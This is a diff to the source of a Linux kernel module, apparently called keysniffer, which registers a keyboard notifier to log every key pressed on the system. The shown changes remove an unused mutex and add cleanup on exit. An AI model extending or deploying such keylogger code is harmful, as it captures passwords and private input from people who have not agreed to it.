@@ -8,7 +8,6 @@ MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
 MODULE_DESCRIPTION("A kernel module to sniff and log the keys pressed in the system");
 
 /* Declarations */
-static struct mutex kbd_mutex;
 int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param);
 
 /* Definitions */
@@ -31,7 +30,6 @@ static int __init keysniffer_init(void)
 	pr_debug("keysniffer init\n");
 
 	register_keyboard_notifier(&keysniffer_blk);
-	mutex_init(&kbd_mutex);
 
 	return 0;
 }
@@ -39,6 +37,9 @@ static int __init keysniffer_init(void)
 static void __exit keysniffer_exit(void)
 {
 	pr_debug("keysniffer exit\n");
+
+	unregister_keyboard_notifier(&keysniffer_blk);
+
 	return;
 }
 
